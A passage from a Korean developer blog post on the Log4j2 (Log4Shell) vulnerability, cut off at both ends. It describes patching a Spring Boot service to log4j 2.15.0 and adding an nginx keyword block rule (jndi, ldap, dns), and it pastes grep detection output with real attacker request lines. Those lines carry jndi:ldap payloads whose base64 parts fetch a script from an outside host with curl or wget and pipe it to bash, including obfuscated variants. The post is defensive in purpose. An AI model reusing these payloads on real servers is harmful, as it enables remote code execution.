9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>요새 시끄러운 log4j2 공격…</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 700px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 39.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABh0lEQVQY03WQ7ysDcQDG70+SkmQbOz9eKFJeUEvCxNnuRu3FRm1eMbzYCxR74dVqJWt29x2ZC1tuMjHaD3Fik5iabSys7e771e5qiTx9Xjxvnp76YBTA/2PC1zriqXde2BBCAhQQgqgSCKFcEEaBFgrgJKM2gJafUAA3gNZRT0M0HUIIiVCsbqrBdIxKOmkbp5WEt5HwKghaQXgbKYDrthWzRwMCKomi8FUqCGK5LJaK5c9CMSeIZQhFzML2BpMeW0BrYXsXgqN2jrJz5GJwzLzf1bNYM2LU5LJ5+np15djIpRj21sWlmMCd2887b18vMVtg2B1btrJ9jvDUZmxp/czqOJ3e413zocFOU622nziPhx0R0+zB4EbUHnk65DORZO4q8/H0XsxieqZ5LjBk3u0mGfWkr11Hq3S00rjTQYLmGVbzknlGCEXTnJ93Pr7x0TQXfzl5yN9UvCGIUQAnaIWeaZK1VVVrPXVbiTVJlYD+RDIujWW3vyCB+j6XkD1LCFAqUEK2/Q16Qk3zLTqZWgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0e32bfff29f0372fb45d54216e2f659f/7c297/thumbnail_spring.webp 180w,\n/static/0e32bfff29f0372fb45d54216e2f659f/33ecc/thumbnail_spring.webp 360w,\n/static/0e32bfff29f0372fb45d54216e2f659f/84c6d/thumbnail_spring.webp 700w\"\n              sizes=\"(max-width: 700px) 100vw, 700px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0e32bfff29f0372fb45d54216e2f659f/e9ea2/thumbnail_spring.png 180w,\n/static/0e32bfff29f0372fb45d54216e2f659f/53918/thumbnail_spring.png 360w,\n/static/0e32bfff29f0372fb45d54216e2f659f/a27c6/thumbnail_spring.png 700w\"\n            sizes=\"(max-width: 700px) 100vw, 700px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0e32bfff29f0372fb45d54216e2f659f/a27c6/thumbnail_spring.png\"\n            alt=\"thumbnail\"\n            title=\"thumbnail\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>요새 Log4J2 취약점 때문에 난리다.<br>\n사실 이 이슈가 알려진건 좀 되었다. (물론 일주일 전에 오픈된거로 알고 있긴 하지만…)<br>\n보안쪽은 이런 큰 문제가 터지면 바로 대응해야 한다.<br>\n조금만 늦게 대응하는 순간 비트코인 마냥 추락하는 거대한 손실을 껴안을 수 있다.<br>\n개발쪽은 역시 부지런해야 살아남는듯…</p>\n<p>사설이 길었다.<br>\n이번 이슈에 대해서는 많은 사람이 적었기에 따로 언급은 안하겠다.<br>\n정 궁금하신 분은 <strong><a href=\"https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389\">이곳 KISA</a></strong> 에서 확인해보기 바란다.</p>\n<p>나는 현재 개인적으로 돌리는 서비스가 있는데 Spring boot 기반으로 되어 있다.<br>\n저 이슈보자마자 바로 문제가 생기겠구나 싶어서 확인했다.<br>\n처리는 금방 했는데 블로그에는 좀 늦게 올리게 되었다.</p>\n<br>\n<h2 id=\"어떻게-공격이-들어오는가\" style=\"position:relative;\"><a href=\"#%EC%96%B4%EB%96%BB%EA%B2%8C-%EA%B3%B5%EA%B2%A9%EC%9D%B4-%EB%93%A4%EC%96%B4%EC%98%A4%EB%8A%94%EA%B0%80\" aria-label=\"어떻게 공격이 들어오는가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>어떻게 공격이 들어오는가?</h2>\n<p>일단 불법적으로 들어오는 것들을 조사하는 로그 서버에서 이런 결과가 들어있었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 1.6666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAARElEQVQI1x2IwQ2AMAzEGCmKRJ80uYTSgth/nEPkYVn2dq2HyEGPZDfQPKoNwaMbc0w6koizfnfU+5n3y701ighVtfwBiwIi+pWP7aMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/769b261384b168f466560382be26ccd4/7c297/img_01.webp 180w,\n/static/769b261384b168f466560382be26ccd4/33ecc/img_01.webp 360w,\n/static/769b261384b168f466560382be26ccd4/df77d/img_01.webp 720w,\n/static/769b261384b168f466560382be26ccd4/5c666/img_01.webp 1080w,\n/static/769b261384b168f466560382be26ccd4/b3358/img_01.webp 1301w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/769b261384b168f466560382be26ccd4/e9ea2/img_01.png 180w,\n/static/769b261384b168f466560382be26ccd4/53918/img_01.png 360w,\n/static/769b261384b168f466560382be26ccd4/242a6/img_01.png 720w,\n/static/769b261384b168f466560382be26ccd4/b4ad3/img_01.png 1080w,\n/static/769b261384b168f466560382be26ccd4/14a3e/img_01.png 1301w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/769b261384b168f466560382be26ccd4/242a6/img_01.png\"\n            alt=\"img 01\"\n            title=\"img 01\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span>\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 1.6666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAP0lEQVQI1z2KyQ3AMAzDupKN5ulLdvcfSUFToC+BpC7zYFYzMWctklFg9fBt5h975O/OF83CEPPwXosiQlXlBnDKIpUpX1xwAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/aec2f20ca53fea94b29439398a0b85e9/7c297/img_02.webp 180w,\n/static/aec2f20ca53fea94b29439398a0b85e9/33ecc/img_02.webp 360w,\n/static/aec2f20ca53fea94b29439398a0b85e9/df77d/img_02.webp 720w,\n/static/aec2f20ca53fea94b29439398a0b85e9/5c666/img_02.webp 1080w,\n/static/aec2f20ca53fea94b29439398a0b85e9/95f20/img_02.webp 1440w,\n/static/aec2f20ca53fea94b29439398a0b85e9/aa71c/img_02.webp 1532w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/aec2f20ca53fea94b29439398a0b85e9/e9ea2/img_02.png 180w,\n/static/aec2f20ca53fea94b29439398a0b85e9/53918/img_02.png 360w,\n/static/aec2f20ca53fea94b29439398a0b85e9/242a6/img_02.png 720w,\n/static/aec2f20ca53fea94b29439398a0b85e9/b4ad3/img_02.png 1080w,\n/static/aec2f20ca53fea94b29439398a0b85e9/89066/img_02.png 1440w,\n/static/aec2f20ca53fea94b29439398a0b85e9/b5cb9/img_02.png 1532w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/aec2f20ca53fea94b29439398a0b85e9/242a6/img_02.png\"\n            alt=\"img 02\"\n            title=\"img 02\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>동작 방식은 사실 대충 알고, 자세하게 동작하는 방식은 <strong><a href=\"https://www.popit.kr/log4j-%EB%B3%B4%EC%95%88-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%8F%99%EC%9E%91%EC%9B%90%EB%A6%AC-%EB%B0%8F-jenkins-%EC%84%9C%EB%B2%84-%ED%99%95%EC%9D%B8-%EB%B0%A9%EB%B2%95/\">popit</a></strong> 게시글을 참고하자.<br>\n(여담인데 난 원리까진 모르고 어떻게만 공격해서 들어오는지 까지만 알기에… 공격 기법이나 원리에 대한 설명은 무지해서 적을 수 없다…)</p>\n<p>내가 이해한 바로는 log.info 나 log.warn() 등을 통해 로깅을 할 때 메세지에 다음과 같이 적을 때 발생한다.</p>\n<blockquote>\n<p>log.error(“Req Access UA : ” + req.getHeader(“X-Api-Version”) );</p>\n</blockquote>\n<p>위는 예시이다.<br>\n저런식으로 로그를 남기게 해서 공격자의 코드를 수행할 수 있게 한다는거 같다</p>\n<blockquote>\n<p>jandi:ldap://공격자-ip/http443path</p>\n</blockquote>\n<p>위 사진을 보면 알겠지만 저렇게 ldap 뒤에 공격자의 주소를 넣어서 처리하는 식으로 들어온다.</p>\n<br>\n<h2 id=\"그래서-어떻게-처리했는가\" style=\"position:relative;\"><a href=\"#%EA%B7%B8%EB%9E%98%EC%84%9C-%EC%96%B4%EB%96%BB%EA%B2%8C-%EC%B2%98%EB%A6%AC%ED%96%88%EB%8A%94%EA%B0%80\" aria-label=\"그래서 어떻게 처리했는가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>그래서 어떻게 처리했는가?</h2>\n<p>뭐 별거 없다.<br>\n그냥 log4j 버전업을 했다.<br>\n사진을 못찍었는데 나의 경우 spring boot starter 의 logging 이었나 이게 2.11 버전을 쓰고 있었다.</p>\n<p>그래서 그냥 버전을 올렸다.<br>\n<strong>Gradle</strong> 을 사용하는데 아래와 같이 한줄 넣어줬다.</p>\n<div class=\"gatsby-highlight\" data-language=\"gradle\"><pre class=\"language-gradle\"><code class=\"language-gradle\"><span class=\"token punctuation\">...</span>\next<span class=\"token punctuation\">[</span><span class=\"token string\">'log4j2.version'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'2.15.0'</span>\n\n<span class=\"token keyword\">dependencies</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token punctuation\">....</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">....</span></code></pre></div>\n<p>위와 같이 한줄 넣고 gradle을 새로 받아오니 log4j의 버전이 2.15로 되었다.<br>\n이렇게 대응이 완료되었다… ㅡ,.ㅡ;;</p>\n<p>그리고…이건 공격 대응이 될지 모르겠지만…<br>\nnginx 앞단에서 특정 키워드로 접근하는 것을 막는 부분에 다음과 같이 추가해줬다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">...\n\t~*(j_spring_security_check|wps|cgi|asmx|jndi|dns|securityscan|ldap) 1;\n...</code></pre></div>\n<p>이렇게 하면 서비스 접근 전에 nginx에서 컷 시킬수 있지 않을까 싶다. (안될수도?)<br>\n근데 이렇게 하니 로그 서버에 저런 비 정상적인 접근은 더 이상 들어오지 않았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 563px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAfklEQVQI132OSw7DIAxEc6PwUwk0AYwJae9/oKnsTaSq6mIWnhk/ezlKhXMO1tofctiPgj4mWmc0YvW99xjzhVIJj7jBGANjVs2W/0B7A4lRiXVZgK0P8HlhzDdKbdpToAxSEOi3xJeDnU8FNurqhxD0w5QyYtyQnztSzpp9AJ5ZYz0Ui31oAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4225f2521cd918169f91b37e67f46deb/7c297/img_03.webp 180w,\n/static/4225f2521cd918169f91b37e67f46deb/33ecc/img_03.webp 360w,\n/static/4225f2521cd918169f91b37e67f46deb/1b3b6/img_03.webp 563w\"\n              sizes=\"(max-width: 563px) 100vw, 563px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4225f2521cd918169f91b37e67f46deb/e9ea2/img_03.png 180w,\n/static/4225f2521cd918169f91b37e67f46deb/53918/img_03.png 360w,\n/static/4225f2521cd918169f91b37e67f46deb/e80ce/img_03.png 563w\"\n            sizes=\"(max-width: 563px) 100vw, 563px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4225f2521cd918169f91b37e67f46deb/e80ce/img_03.png\"\n            alt=\"img 03\"\n            title=\"img 03\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>단지 위와 같이 무지성으로 대입해서 들어오는 것들이 많을 뿐…</p>\n<p>그리고 하단의 참고 항목을 보면 Cisco talos 차단 권고 항목에 ip가 있다.<br>\n여기에 등록된 ip 전부 밴 처리 해뒀다.</p>\n<br>\n<h2 id=\"정리-및-참고-그리고-부록\" style=\"position:relative;\"><a href=\"#%EC%A0%95%EB%A6%AC-%EB%B0%8F-%EC%B0%B8%EA%B3%A0-%EA%B7%B8%EB%A6%AC%EA%B3%A0-%EB%B6%80%EB%A1%9D\" aria-label=\"정리 및 참고 그리고 부록 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>정리 및 참고 그리고 부록…</h2>\n<h3 id=\"정리\" style=\"position:relative;\"><a href=\"#%EC%A0%95%EB%A6%AC\" aria-label=\"정리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>정리</h3>\n<p>근데 개인적인 생각인데 User Agent 를 로깅 안하면 영향은 없지 않을까? (개인적 무지성 판단…)<br>\n얼른 대응해서 큰 피해 안나게 조심하자…</p>\n<br>\n<h3 id=\"참고\" style=\"position:relative;\"><a href=\"#%EC%B0%B8%EA%B3%A0\" aria-label=\"참고 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>참고</h3>\n<p><a href=\"https://labrador.iotcube.com\">래브라도 취약점 점검 도구-한글</a><br>\n<a href=\"https://blog.lgcns.com/2740\">LG CNS의 차단 대응 및 안내 -한글</a><br>\n<a href=\"https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot\">Spring 공식 레퍼런스 대응 -영문</a><br>\n<a href=\"https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b\">Log4J 악용탐지-영문</a><br>\n<a href=\"https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html\">Cisco talos 차단 권고-영문</a></p>\n<br>\n<h3 id=\"부록---악용탐지\" style=\"position:relative;\"><a href=\"#%EB%B6%80%EB%A1%9D---%EC%95%85%EC%9A%A9%ED%83%90%EC%A7%80\" aria-label=\"부록   악용탐지 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>부록 - 악용탐지</h3>\n<p>위의 참고 중에 악용 탐지 gist 항목을 보면…<br>\n<strong>/var/log 폴더 및 모든 하위 폴더의 압축되지 않은 파일에서 악용 시도</strong> 에 대한 검색을 할 수 있는 grep 명령어를 제공한다.</p>\n<p>한번 돌려봤다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">fuck-hack@ip-999-444-999-444:~$ sudo egrep -I -i -r '\\$(\\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\\n]+' /var/log\n/var/log/nginx/access.log.1:51.89.237.81 - - [13/Dec/2021:04:28:09 +0900] \"GET /$%7Bjndi:ldap://79.172.214.11:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==%7D HTTP/1.0\" 404 162 \"-\" \"mozila\"\n/var/log/nginx/access.log.1:45.83.67.182 - - [13/Dec/2021:12:37:28 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1\" 404 134 \"${jndi:dns://45.83.64.1/securityscan-http80}\" \"${jndi:dns://45.83.64.1/securityscan-http80}\"\n/var/log/nginx/access.log.1:45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1\" 302 0 \"${jndi:dns://45.83.64.1/securityscan-https443}\" \"${jndi:dns://45.83.64.1/securityscan-https443}\"\n/var/log/nginx/access.log.1:45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET / HTTP/1.1\" 200 7587 \"${jndi:dns://45.83.64.1/securityscan-https443}\" \"${jndi:dns://45.83.64.1/securityscan-https443}\"\n/var/log/nginx/access.log.1:195.54.160.149 - - [13/Dec/2021:13:45:17 +0900] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo} HTTP/1.1\" 200 396 \"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\" \"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.1:167.172.44.255 - - [13/Dec/2021:20:45:05 +0900] \"GET / HTTP/1.0\" 200 612 \"-\" \"borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClass}\"\n\n=====\n\nfuck-hack@ip-999-444-999-444:~$ sudo find /var/log -name \\*.gz -print0 | xargs -0 zgrep -E -i '\\$(\\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\\n]+'\n/var/log/nginx/access.log.3.gz:45.155.205.233 - - [11/Dec/2021:03:21:49 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.3.gz:1.116.59.211 - - [11/Dec/2021:19:13:15 +0900] \"GET /${jndi:ldap://45.130.229.168:1389/Exploit} HTTP/1.1\" 404 162 \"-\" \"curl/7.58.0\"\n/var/log/nginx/access.log.3.gz:195.251.41.139 - - [11/Dec/2021:21:13:15 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"/${jndi:ldap://45.130.229.168:1389/Exploit}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:02:26:12 +0900] \"GET / HTTP/1.1\" 200 7417 \"-\" \"${jndi:ldap://http443useragent.kryptoslogic-cve-2021-44228.com/http443useragent}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:04:03:54 +0900] \"GET /$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D HTTP/1.1\" 302 0 \"-\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:04:03:54 +0900] \"GET / HTTP/1.1\" 200 7418 \"https://3.36.159.204/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:08:26:47 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://http80useragent.kryptoslogic-cve-2021-44228.com/http80useragent}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:09:42:21 +0900] \"GET /$%7Bjndi:ldap://http80path.kryptoslogic-cve-2021-44228.com/http80path%7D HTTP/1.1\" 404 134 \"-\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:45.155.204.20 - - [12/Dec/2021:10:01:33 +0900] \"GET /?x=${jndi:ldap://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com/a} HTTP/1.1\" 400 800 \"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com}\" \"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:02:36:55 +0900] \"POST /?&amp;token=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 405 0 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"POST /api?&amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"GET / HTTP/1.1\" 200 7637 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"GET /api?&amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - 